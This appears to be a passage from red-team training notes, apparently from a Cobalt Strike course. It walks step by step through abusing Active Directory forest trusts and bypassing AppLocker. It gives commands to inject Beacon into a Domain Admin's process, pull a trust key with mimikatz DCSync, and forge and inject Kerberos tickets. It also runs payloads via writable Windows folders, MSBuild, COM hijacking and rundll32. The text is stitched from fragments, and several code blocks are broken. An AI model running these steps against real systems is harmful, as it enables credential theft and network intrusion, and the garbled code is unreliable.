> This is the "referral" step — CONTOSO's KDC hands you a ticket that partner.com's KDC will accept. It's signed with the inter-domain trust key, not the krbtgt hash of either domain.

---

### Step 4 — Request CIFS Service Ticket in Foreign Domain

\`\`\`bash
krb_asktgs \\
  /service:cifs/par-jmp-1.partner.com \\
  /targetdomain:partner.com \\
  /dc:par-dc-1.partner.com \\
  /ticket:[INTER-REALM TICKET]
\`\`\`

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| \`/service\` | \`cifs/par-jmp-1.partner.com\` | Service to request TGS for in the foreign domain |
| \`/targetdomain\` | \`partner.com\` | The foreign domain — tells Rubeus which KDC to contact |
| \`/dc\` | \`par-dc-1.partner.com\` | The foreign domain's DC to send the TGS-REQ to |
| \`/ticket\` | Inter-realm ticket | Proof of rsteel's identity to partner.com KDC |

**What happens:**
\`\`\`
Inter-realm ticket → TGS-REQ to par-dc-1.partner.com
    ↓
par-dc-1 decrypts inter-realm ticket using trust key → validates rsteel's identity
par-dc-1 checks: is rsteel (via Partner Jump Users → Contoso Users) local admin on par-jmp-1?
    YES → issues TGS for cifs/par-jmp-1.partner.com
\`\`\`

---

### Step 5 — Access the Foreign Domain Machine

\`\`\`bash

make_token CONTOSO\\rsteel FakePass
kerberos_ticket_use [path to cifs TGS]
run klist

# Access par-jmp-1
ls \\\\par-jmp-1.partner.com\\c$

| Property | Parent-Child (within-forest) | Inbound (cross-forest) |

| \`trustAttributes\` | \`32\` (WITHIN_FOREST) | \`8\` (FOREST_TRANSITIVE) |
| SID Filtering | Disabled | **Enabled** |
| SID History Attack | Works | **Blocked** |
| Attack method | Golden Ticket + \`/sids\` | Manual Kerberos referral chain |

## Key Takeaways

- \`trustDirection=1\` (INBOUND) = **partner.com trusts us** — CONTOSO users can access partner.com if granted rights
- \`trustAttributes=8\` (FOREST_TRANSITIVE) = cross-forest trust = **SID filtering enabled** — Golden Ticket + \`/sids\` does not work here
- **Foreign Security Principals** are the key enumeration target — they reveal which CONTOSO principals have been granted access in partner.com
- The access chain is: rsteel → Partner Jump Users → Contoso Users (FSP in partner.com) → local Administrators via GPO Restricted Groups
- Cross-forest Kerberos requires **three steps**: TGT → inter-realm referral → service TGS. You cannot skip directly to the service ticket.
- \`krb_asktgs /service:krbtgt/partner.com\` is the inter-realm step — this is the most commonly missed command in this chain

## The Full Chain

\`\`\`
ldapsearch → enumerate trust (outbound, forest-transitive)
    ↓
ldapsearch → get TDO objectGUID for the trusted domain
    ↓
Inject Beacon into vwebber process (DA context needed for DCSync)
    ↓
mimikatz dcsync /guid:{TDO GUID} → extract shared inter-realm trust key
    ↓
krb_asktgt /user:PARTNER$ /rc4:[trust key] → TGT for trust account in CONTOSO
    ↓
make_token + kerberos_ticket_use → inject TGT into sacrificial session
    ↓
ldapsearch --hostname contoso.com → enumerate foreign domain as trust account
\`\`\`

---

## Background — One-Way Outbound Trust

\`\`\`
CONTOSO → trusts → partner.com   (outbound from CONTOSO's perspective)
\`\`\`

**Direction from CONTOSO's perspective:**
- \`TRUST_DIRECTION_OUTBOUND (2)\` = CONTOSO trusts partner.com
- partner.com users can access CONTOSO resources? **Yes — if granted**
- CONTOSO users can access partner.com resources? **No**

> An outbound trust is the mirror of the inbound trust lab — the foreign domain's users could potentially access our resources. The attack here is different: we can't use our own credentials to authenticate to partner.com. Instead, we extract the **shared trust secret** to impersonate a trust account and enumerate the foreign domain.

**\`trustAttributes=8\` = \`TRUST_ATTRIBUTE_FOREST_TRANSITIVE\`** — cross-forest trust, SID filtering enabled. SID history attacks are blocked.

---

## Step 1 — Enumerate the Trust

\`\`\`bash
ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
\`\`\`

| Attribute | Value | Meaning |
|---|---|---|
| \`trustDirection\` | \`2\` | \`TRUST_DIRECTION_OUTBOUND\` — CONTOSO trusts partner.com |
| \`trustAttributes\` | \`8\` | \`TRUST_ATTRIBUTE_FOREST_TRANSITIVE\` — cross-forest |
| \`trustPartner\` | \`partner.com\` | The trusted foreign domain |

**TTP:** T1482 — Domain Trust Discovery

---

## Step 2 — Get the TDO GUID

Every trusted domain has a **Trust Domain Object (TDO)** in AD — a special object in the \`System\\Trusted Domains\` container that stores the trust relationship metadata, including the **shared inter-realm key** (the trust password). The TDO's GUID is needed to target it with DCSync.

\`\`\`bash
ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
\`\`\`

> Returns: \`objectGUID = {288d9ee6-2b3c-42aa-bef8-959ab4e484ed}\`

Save this GUID — it's used as the \`/guid\` parameter in the mimikatz DCSync call.

---

## Step 3 — Inject Into a DA Process (vwebber)

DCSync requires Domain Admin or equivalent privileges. The instruction is to inject a Beacon into a \`vwebber\` process — vwebber is a DA in this environment.

\`\`\`bash
# Find vwebber's process
ps

# Inject Beacon into vwebber process
inject [PID] x64 [listener]    # or steal_token [PID]
\`\`\`

> This gives you a Beacon running under DA credentials — required for the DCSync of the TDO object.

---

## Step 4 — DCSync the Inter-Realm Trust Key

\`\`\`bash
mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
\`\`\`

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| \`lsadump::dcsync\` | — | Use DRS replication protocol to pull secrets |
| \`/domain\` | \`partner.com\` | Target the foreign domain's TDO |
| \`/guid\` | \`{TDO GUID}\` | Target this specific object by GUID rather than by account name |

**What this returns:**
\`\`\`
* Primary:NTLM-Strong-NTOWF *
    rc4_hmac: [TRUST KEY HASH]
\`\`\`

> The trust key is a **shared secret** between CONTOSO and partner.com. It's used to encrypt inter-realm tickets at the trust boundary. Possessing it means you can forge inter-realm tickets or — as done here — request a TGT as the trust account.

**Why \`/guid\` instead of \`/user\`:** The TDO doesn't have a standard \`samAccountName\` like a user account. Targeting by GUID is the reliable way to pull its secrets. The GUID uniquely identifies the TDO for partner.com in CONTOSO's directory.

**TTP:** T1003.006 — OS Credential Dumping: DCSync

---

## Step 5 — Request TGT as Trust Account

Every outbound trust creates a corresponding **trust account** in the domain — a user account named \`PARTNER$\` (foreign domain's NetBIOS name + \`$\`). This account's password is the inter-realm trust key. You can use it to authenticate to CONTOSO as if you were the trust account.

\`\`\`bash
krb_asktgt /user:PARTNER$ /rc4:[TRUST KEY] /domain:contoso.com /dc:lon-dc-1.contoso.com
\`\`\`

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| \`/user\` | \`PARTNER$\` | The trust account — named after the foreign domain's NetBIOS name |
| \`/rc4\` | Trust key hash | The inter-realm shared secret used as the password |
| \`/domain\` | \`contoso.com\` | Our domain — request TGT from CONTOSO's KDC |
| \`/dc\` | \`lon-dc-1.contoso.com\` | Specific DC to send AS-REQ to |

> The trust account \`PARTNER$\` exists in CONTOSO's directory and is used internally for the trust relationship. By obtaining its TGT, you're authenticated to CONTOSO's KDC as this account — which has the ability to query the foreign domain across the trust boundary.

---

## Step 6 — Inject TGT into Sacrificial Session

\`\`\`bash
# Create sacrificial logon session
make_token CONTOSO\\PARTNER$ FakePass

# Inject the TGT
kerberos_ticket_use [path to PARTNER$ TGT]

# Verify
run klist
\`\`\`

---

## Step 7 — Enumerate the Foreign Domain

With the trust account TGT injected, query partner.com directly:

\`\`\`bash
# Get domain SID and basic info for partner.com
ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid
\`\`\`

> Note: The lab queries \`contoso.com\` here — the trust account perspective allows querying across the trust boundary. In practice you'd query \`partner.com\` objects to find attack surface.

**What to look for during outbound trust enumeration:**

| Target | Command | Purpose |
|---|---|---|
| Kerberoastable accounts | \`ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*))\` against partner.com | Find crackable hashes |
| DA/EA accounts | \`ldapsearch (&(samAccountType=268435456)(samAccountName=Domain Admins))\` | Map privileged groups |
| FSPs in partner.com | \`ldapsearch (objectClass=foreignSecurityPrincipal)\` | Find CONTOSO principals with partner.com access |
| Computers | \`ldapsearch (samAccountType=805306369)\` | Enumerate machines |

---

## The Trust Key — What It Is and Why It Matters

\`\`\`
When two domains establish a trust, they negotiate a shared secret (the trust key/password).
This key is stored in:
  - CONTOSO: as the TDO object for partner.com (in System\\Trusted Domains)
  - partner.com: as the TDO object for CONTOSO

The key is used to encrypt inter-realm referral tickets at the trust boundary.
It rotates periodically (like computer account passwords) — but DCSync captures the current value.

Possessing the trust key allows:
  1. Request a TGT as the PARTNER$ trust account → enumerate foreign domain
  2. Forge inter-realm referral tickets to request service tickets in partner.com
     (if SID filtering is disabled — blocked in this cross-forest scenario)
\`\`\`

---

## Outbound vs Inbound vs Parent-Child Comparison

| Property | Parent-Child | Inbound | Outbound |
|---|---|---|---|
| \`trustDirection\` | \`3\` (Bidirectional) | \`1\` (Inbound) | \`2\` (Outbound) |
| \`trustAttributes\` | \`32\` (Within-Forest) | \`8\` (Forest-Transitive) | \`8\` (Forest-Transitive) |
| SID Filtering | Disabled | Enabled | Enabled |
| Attack goal | Escalate to parent EA | Access foreign machines | Enumerate foreign domain |
| Key material needed | Child krbtgt AES256 | Target user's AES256 | TDO inter-realm trust key |
| Primary technique | Golden Ticket + /sids | Kerberos referral chain | DCSync TDO → trust account TGT |
| SID history attack | Works | Blocked | Blocked |

| TTP | Technique | Detail |

| T1482 | Domain Trust Discovery | ldapsearch trust + TDO GUID enumeration |
| T1003.006 | DCSync | Extract inter-realm trust key from TDO via GUID |
| T1550.003 | Pass the Ticket | Inject PARTNER$ TGT into sacrificial session |
| T1087.002 | Account Discovery: Domain Account | Enumerate partner.com users/groups via trust account |

## Key Takeaways

- \`trustDirection=2\` (OUTBOUND) = **we trust partner.com** — their users could access our resources (if granted), but we can't use our credentials to authenticate to them directly
- The **TDO (Trust Domain Object)** stores the inter-realm trust key — it's the equivalent of a computer account password for the trust relationship
- DCSync by **\`/guid\`** is required for TDOs — they don't have a standard \`samAccountName\` so you can't target them with \`/user\`
- The trust account **\`PARTNER$\`** exists in CONTOSO's directory — its password is the trust key, and its TGT lets you query across the trust boundary
- Outbound trust enumeration is primarily about **reconnaissance** of the foreign domain — finding kerberoastable accounts, privileged groups, FSPs, and other attack surface
- This technique does **not** give you admin access to partner.com directly — it gives you authenticated read access to enumerate partner.com's directory, from which you'd identify further attack paths
- SID filtering is enabled (cross-forest trust) — the Golden Ticket + \`/sids\` technique from the Parent-Child lab is blocked here
- The trust key **rotates periodically** (like a computer account password) — the extracted RC4 hash is only valid until the next rotation`},

## What Is AppLocker?

AppLocker is a Windows application control technology that prevents users from running unapproved executables, scripts, installers, and packages. Policies are defined by rule collections, each containing:

- **Permission:** Allow or Deny + the user/group it applies to
- **Condition:** Publisher (signed cert), Path (file/folder), or File Hash

Policies are deployed via GPO or Intune.

### Default AppLocker Rules

**Executable Rules** (\`.exe\`, \`.com\`):
\`\`\`
Allow | Everyone           | Path | %PROGRAMFILES%\\*
Allow | Everyone           | Path | %WINDIR%\\*
Allow | BUILTIN\\Administrators | Path | *
\`\`\`

**Windows Installer Rules** (\`.msi\`, \`.msp\`, \`.mst\`):
\`\`\`
Allow | Everyone           | Publisher | *
Allow | Everyone           | Path      | %WINDIR%\\Installer\\*
Allow | BUILTIN\\Administrators | Path  | *.*
\`\`\`

**Script Rules** (\`.ps1\`, \`.bat\`, \`.cmd\`, \`.vbs\`, \`.js\`):
\`\`\`
Allow | Everyone           | Path | %PROGRAMFILES%\\*
Allow | Everyone           | Path | %WINDIR%\\*
Allow | BUILTIN\\Administrators | Path | *
\`\`\`

**Packaged App Rules** (\`.appx\`):
\`\`\`
Allow | Everyone           | Publisher | *
\`\`\`

> **Key insight:** Administrators can run anything (\`*\`). Standard users are limited to \`%PROGRAMFILES%\\*\` and \`%WINDIR%\\*\`. All bypasses target writable locations within those allowed paths.

Blocked execution looks like the screenshot — "This app has been blocked by your system administrator."

---

## Phase 1 — Enumeration

Understanding the policy is essential before attempting a bypass — you need to know what's allowed and where writable paths exist.

### Method A — Registry (on a protected machine)

Use when you already have console/Beacon access to the AppLocker-protected machine.

\`\`\`powershell
# List all rule collections and their enforcement mode
Get-ChildItem 'HKLM:Software\\Policies\\Microsoft\\Windows\\SrpV2'

# Key values:
# EnforcementMode: 1 = Enforced, 0 = Audit only
# Rule collections: Appx, Dll, Exe, Msi, Script
\`\`\`

**Parse Exe rules (raw XML):**
\`\`\`powershell
Get-ChildItem 'HKLM:Software\\Policies\\Microsoft\\Windows\\SrpV2\\Exe'
# Returns each rule as an XML string in the Value property
\`\`\`

**Parse rules cleanly with native cmdlet:**
\`\`\`powershell
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections
# Returns: PathConditions, Action, UserOrGroupSid, Name for each rule
\`\`\`

**Registry path reference:**

| Path | Rule Collection |
|---|---|
| \`HKLM:\\Software\\Policies\\Microsoft\\Windows\\SrpV2\\Exe\` | Executable rules |
| \`HKLM:\\Software\\Policies\\Microsoft\\Windows\\SrpV2\\Script\` | Script rules |
| \`HKLM:\\Software\\Policies\\Microsoft\\Windows\\SrpV2\\Msi\` | Installer rules |
| \`HKLM:\\Software\\Policies\\Microsoft\\Windows\\SrpV2\\Appx\` | Packaged app rules |
| \`HKLM:\\Software\\Policies\\Microsoft\\Windows\\SrpV2\\Dll\` | DLL rules (rarely enabled) |

---

### Method B — GPO / SysVol (from an unprotected machine)

Use when you have a Beacon on an unprotected machine and need to analyse the policy before moving laterally to a protected one.

**Step 1 — Find the AppLocker GPO:**
\`\`\`bash
ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath
# Look for a GPO named "AppLocker" or similar
# Note the gPCFileSysPath: \\\\contoso.com\\SysVol\\contoso.com\\Policies\\{8ECEE926-...}
\`\`\`

**Step 2 — List the GPO's Machine directory:**
\`\`\`bash
ls \\\\contoso.com\\SysVol\\contoso.com\\Policies\\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\\Machine
# Look for Registry.pol
\`\`\`

**Step 3 — Download Registry.pol:**
\`\`\`bash
download \\\\contoso.com\\SysVol\\contoso.com\\Policies\\{8ECEE926-...}\\Machine\\Registry.pol
\`\`\`

**Step 4 — Parse on attacker desktop:**
\`\`\`powershell
Parse-PolFile -Path .\\Desktop\\Registry.pol
# Returns KeyName, ValueName, ValueData (XML rule strings) for each AppLocker rule
# KeyName format: Software\\Policies\\Microsoft\\Windows\\SrpV2\\<collection>\\<GUID>
\`\`\`

> \`Parse-PolFile\` is from the \`GpRegistryPolicy\` PowerShell module. The output is the same XML as the registry method — parse \`FilePathCondition Path=\` attributes to identify allowed directories.

## Phase 2 — Bypasses

Once you understand the policy, find a bypass. The goal: **execute a payload from a path that AppLocker allows.**

---

### Bypass 1 — Writable Directories in %WINDIR%

\`%WINDIR%\\*\` is allowed for everyone by default. Several directories within \`%WINDIR%\` are writable by standard users:

\`\`\`
C:\\Windows\\Tasks                              ← most reliable
C:\\Windows\\Temp
C:\\Windows\\Tracing
C:\\Windows\\System32\\spool\\PRINTERS
C:\\Windows\\System32\\spool\\SERVERS
C:\\Windows\\System32\\spool\\drivers\\color
\`\`\`

**The bypass — copy and execute from a writable allowed path:**

As shown in the screenshot:
\`\`\`cmd
# test.exe on Desktop → BLOCKED
test.exe
# "This program is blocked by group policy"

# Copy to C:\\Windows\\Tasks → ALLOWED
copy test.exe C:\\Windows\\Tasks
C:\\Windows\\Tasks\\test.exe
# Executes successfully — "AppLocker Bypass" dialog appears
\`\`\`

**In Beacon:**
\`\`\`bash
cd C:\\Windows\\Tasks
upload C:\\Payloads\\http_x64.exe
shell C:\\Windows\\Tasks\\http_x64.exe
\`\`\`

**Find additional writable paths manually:**
\`\`\`powershell
# Check ACLs on directories under %WINDIR%
icacls C:\\Windows\\* | findstr /i "everyone\\|BUILTIN\\Users\\|NT AUTHORITY\\Authenticated"

# Or with Get-Acl
Get-ChildItem C:\\Windows -Directory | ForEach-Object { 
    $acl = Get-Acl $_.FullName
    $acl.Access | Where-Object { $_.IdentityReference -match "Users|Everyone|Authenticated" -and $_.FileSystemRights -match "Write|FullControl" }
}
\`\`\`

---

### Bypass 2 — Path Wildcard Misconfiguration

Custom rules sometimes use overly permissive wildcards. Example vulnerable rule:

\`\`\`xml
<FilePathRule Action="Allow">
    <Conditions>
        <FilePathCondition Path="*\\App-V\\*"/>
    </Conditions>
</FilePathRule>
\`\`\`

\`*\\App-V\\*\` — the leading \`*\` means any path containing \`\\App-V\\\` is allowed, not just \`%PROGRAMFILES%\\App-V\\\`. Create a directory called \`App-V\` anywhere and execute from it.

**What to look for when parsing rules:**
- Path conditions that don't start with \`%PROGRAMFILES%\` or \`%WINDIR%\`
- Wildcards in the middle of paths (\`*\\foldername\\*\`)
- Custom application paths that may be user-writable

**Create \`test.csproj\`:**

  </Target>

    TaskName="MSBuild"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll">

      <Code Type="Class" Language="cs">

        using Microsoft.Build.Utilities;
        using System.Windows.Forms;

        {

**Execute:**
\`\`\`cmd
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe test.csproj
\`\`\`

As shown in the screenshot — MSBuild runs from an allowed path, executes arbitrary C# code, bypasses AppLocker entirely.

> For a real Beacon payload, replace the \`Execute()\` method body with shellcode allocation and execution (same pattern as the SQL CLR stored procedure lab).

### Bypass 4 — COM Object via PowerShell CLM

AppLocker enforces **Constrained Language Mode (CLM)** in PowerShell when script rules are active:

\`\`\`powershell
$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage

[System.Console]::WriteLine("Hello World")
# ERROR: Cannot invoke method. Method invocation is supported only on core types.
\`\`\`

CLM blocks direct .NET API calls — but \`New-Object -ComObject\` still works. Abuse this to load a custom COM object that executes a DLL:

**Step 1 — Generate a new CLSID:**
\`\`\`powershell
[System.Guid]::NewGuid()
# e.g. 6136e053-47cb-4fdd-84b1-381bc5f3edb3
\`\`\`

**Step 2 — Register the COM object in HKCU:**
\`\`\`powershell
New-Item -Path 'HKCU:Software\\Classes\\CLSID' -Name '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
New-Item -Path 'HKCU:Software\\Classes\\CLSID\\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}' -Name 'InprocServer32' -Value 'C:\\Users\\pchilds\\Desktop\\bypass.dll'
New-ItemProperty -Path 'HKCU:Software\\Classes\\CLSID\\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}\\InprocServer32' -Name 'ThreadingModel' -Value 'Both'

New-Item -Path 'HKCU:Software\\Classes' -Name 'AppLocker.Bypass' -Value 'AppLocker Bypass'
New-Item -Path 'HKCU:Software\\Classes\\AppLocker.Bypass' -Name 'CLSID' -Value '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
\`\`\`

**Step 3 — Trigger the COM object:**
\`\`\`powershell
New-Object -ComObject AppLocker.Bypass
# Loads bypass.dll via DllMain → executes payload
\`\`\`

As shown in the screenshot — PowerShell in CLM instantiates the COM object, which loads the DLL from the Desktop (or any path), executing the payload.

**bypass.dll source (minimal C++ DLL):**
\`\`\`cpp

extern "C" __declspec(dllexport) BOOL execute() {

**Why this works:** HKCU COM registration is the same technique as the Persistence lab (COM hijacking). CLM blocks .NET API calls but not COM instantiation via \`New-Object -ComObject\`. The DLL is loaded by the PowerShell process — AppLocker's DLL rules are usually **not enabled** (performance concerns, as shown in the screenshot of the disabled DLL rule collection checkbox).

---

### Bypass 5 — rundll32 (DLL Rules Disabled)

AppLocker can enforce DLL rules, but rarely does — the performance impact is significant (shown in the "DLL rules can affect system performance" screenshot). When DLL rules are **not enforced**, arbitrary DLLs can be loaded via \`rundll32\`.

\`\`\`cmd
# Call the exported function from a Beacon DLL
rundll32 bypass.dll,execute
\`\`\`

The Cobalt Strike Beacon DLL payload exports a function called **\`StartW\`** specifically for this use case:

\`\`\`cmd
rundll32 C:\\Windows\\Tasks\\http_x64.dll,StartW
\`\`\`

> The DLL can be placed in any writable \`%WINDIR%\` subdirectory (e.g. \`C:\\Windows\\Tasks\`) since \`%WINDIR%\\*\` is allowed for EXEs. DLL rules being disabled means the DLL itself isn't checked.

---

## AppLocker Bypass Decision Tree

\`\`\`
1. Read the policy (Registry or Parse-PolFile)
       ↓
2. Is %WINDIR%\\* allowed? → Find writable subdirectory → drop EXE there
       ↓ (if EXE blocked or writable path not found)
3. Are DLL rules enabled? → If NO → rundll32 from writable path
       ↓ (if DLL rules enabled)
4. Is MSBuild in an allowed path? → Yes (%WINDIR%) → MSBuild .csproj payload
       ↓ (if script rules block .csproj)
5. Are custom path rules overly permissive? → Find wildcard path → create matching directory
       ↓ (if in PowerShell CLM)
6. COM object via New-Object -ComObject → load DLL into PS process
\`\`\`

## Key Takeaways

- **Always enumerate the policy first** — you can't find a bypass without knowing what's allowed and what paths are writable
- **Two enumeration methods:** registry (\`Get-AppLockerPolicy\`) on a protected machine, GPO/\`Parse-PolFile\` from an unprotected Beacon before lateral movement
- **\`C:\\Windows\\Tasks\` is the most reliable writable allowed path** — it's within \`%WINDIR%\\*\` and writable by standard users on most systems
- **DLL rules are almost never enabled** — if you have a DLL payload, \`rundll32\` is a fast bypass. The CS Beacon DLL exports \`StartW\` specifically for this
- **MSBuild is a powerful LOLBAS** — arbitrary C# execution from an allowed path, no compilation needed, no AV signature on the \`.csproj\` file
- **CLM blocks .NET APIs but not COM** — \`New-Object -ComObject\` is the CLM escape hatch; register in HKCU (no admin required)
- **EnforcementMode: 0 = Audit only** — if you see this in the registry, AppLocker is logging but not blocking. Confirm before assuming you need a bypass.
- Check custom rules for wildcard misconfigurations — any path rule not anchored to \`%PROGRAMFILES%\` or \`%WINDIR%\` is potentially exploitable
- Remember *primum non nocere* — don't disable AppLocker entirely. Find a bypass that works within the policy rather than disabling the control.`}];
